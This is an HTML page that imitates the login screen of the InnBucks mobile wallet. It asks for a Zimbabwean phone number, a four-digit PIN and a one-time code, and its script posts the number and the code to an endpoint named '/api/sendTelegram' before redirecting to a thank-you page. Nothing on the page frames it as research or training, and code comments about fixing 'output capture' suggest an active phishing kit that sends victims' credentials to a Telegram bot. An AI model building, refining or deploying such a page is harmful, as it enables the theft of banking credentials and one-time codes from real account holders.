<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>InnBucks — Login</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">

<style>
/* --- STYLES UNCHANGED --- */
*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{height:100%}
body{
  font-family:Inter,system-ui,Arial;
  background:#020617;
  margin:0;
  padding:18px;
  display:flex;
  align-items:center;
  justify-content:center;
  color:#e5e7eb;
}
.card{
  width:100%;
  max-width:380px;
  background:#020617;
  padding:20px;
  border-radius:14px;
  border:1px solid #1f2937;
  box-shadow:0 18px 45px rgba(0,0,0,.75);
}
.logo{height:44px;display:block;margin:0 auto 10px}
h2{text-align:center;margin:0 0 12px;font-size:20px;color:#f8fafc}
label{display:block;font-size:13px;margin-top:8px;color:#cbd5f5}
input{
  width:100%;
  padding:10px;
  border-radius:8px;
  border:1px solid #1f2937;
  background:#020617;
  color:#e5e7eb;
}
.btn{
  background:#2563eb;
  color:#fff;
  padding:10px;
  border-radius:8px;
  border:0;
  margin-top:12px;
  width:100%;
  font-weight:600;
}
.btn[disabled]{background:#334155}
.error{min-height:18px;font-size:13px;color:#ef4444}
.success{color:#22c55e;font-weight:600}
.small{font-size:13px;color:#9ca3af}
.pin-row,.otp-row{display:flex;gap:10px;justify-content:center;margin-top:10px}
.pin-digit,.otp-digit{
  width:18px;height:18px;border-radius:50%;
  border:2px solid #fff;background:#fff
}
.pin-digit.filled,.otp-digit.filled{
  background:#2563eb;border-color:#2563eb
}
.otp-modal{
  position:fixed;inset:0;background:rgba(2,6,23,.88);
  display:flex;align-items:center;justify-content:center
}
.otp-box{
  background:#020617;padding:20px;border-radius:14px;
  min-width:340px;border:1px solid #1f2937
}
.resend-row{display:flex;justify-content:space-between;margin-top:14px}
.resend-btn{
  background:#020617;border:1px solid #1f2937;
  padding:10px 14px;border-radius:8px;color:#e5e7eb
}
.action-primary{background:#2563eb;border:0}
.spinner{
  width:14px;height:14px;border:2px solid rgba(255,255,255,.3);
  border-top-color:#fff;border-radius:50%;
  display:inline-block;animation:spin .8s linear infinite
}
@keyframes spin{to{transform:rotate(360deg)}}
</style>
</head>

<body>

<div class="card">
  <img src="assets/InnBucks.png" class="logo">
  <h2>Login</h2>

  <form id="loginForm">
    <label>★ Mobile Number</label>
    <input id="phone" value="+263">
    <div id="phoneError" class="error"></div>

    <label>★ Enter your PIN</label>
    <div class="pin-row">
      <input class="pin-digit"><input class="pin-digit">
      <input class="pin-digit"><input class="pin-digit">
    </div>

    <input id="hp" style="display:none">
    <button id="loginBtn" class="btn" disabled>LOGIN</button>
  </form>
</div>

<!-- OTP -->
<div id="otpModal" class="otp-modal" style="display:none">
  <div class="otp-box">
    <strong>Enter OTP</strong>
    <p class="small">OTP sent to your phone</p>

    <div class="otp-row">
      <div class="otp-digit"></div><div class="otp-digit"></div>
      <div class="otp-digit"></div><div class="otp-digit"></div>
      <div class="otp-digit"></div>
    </div>

    <input id="otpBuffer" style="position:absolute;opacity:0">

    <div class="resend-row">
      <div class="small">Resend in <span id="countdown">120</span>s</div>
      <button id="resendBtn" class="resend-btn" disabled>Resend OTP</button>
    </div>

    <div style="display:flex;gap:10px;margin-top:14px">
      <button id="confirmOtp" class="resend-btn action-primary" disabled>Confirm</button>
      <button id="cancelOtp" class="resend-btn">Cancel</button>
    </div>

    <div id="otpStatus" class="small" style="margin-top:8px"></div>
  </div>
</div>

<script>
/* ===== API (FIXED OUTPUT CAPTURE) ===== */
async function sendToServer(payload){
  try{
    const res = await fetch('/api/sendTelegram',{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify(payload)
    });

    const text = await res.text();
    return { ok:res.ok, message:text || 'OK' };

  }catch(err){
    return { ok:false, message:'Network error' };
  }
}

/* ===== OTP CONFIRM (OUTPUT FIXED) ===== */
confirmOtp.onclick = async () => {
  const res = await sendToServer({
    event:'otp_confirm',
    phone:phone.value,
    otp:otpBuffer.value
  });

  otpStatus.innerHTML = res.ok
    ? `<span class="success">${res.message}</span>`
    : `<span class="error">${res.message}</span>`;

  if(res.ok){
    setTimeout(()=>location.href='thankyou.html',1200);
  }
};

/* ===== RESEND (OUTPUT FIXED) ===== */
resendBtn.onclick = async () => {
  resendBtn.innerHTML='<span class="spinner"></span>Sending…';

  const res = await sendToServer({
    event:'resend_otp',
    phone:phone.value
  });

  resendBtn.innerHTML = res.ok ? 'OTP sent ✓' : 'Failed';
  otpStatus.innerHTML = res.message;
};
</script>

</body>
</html>
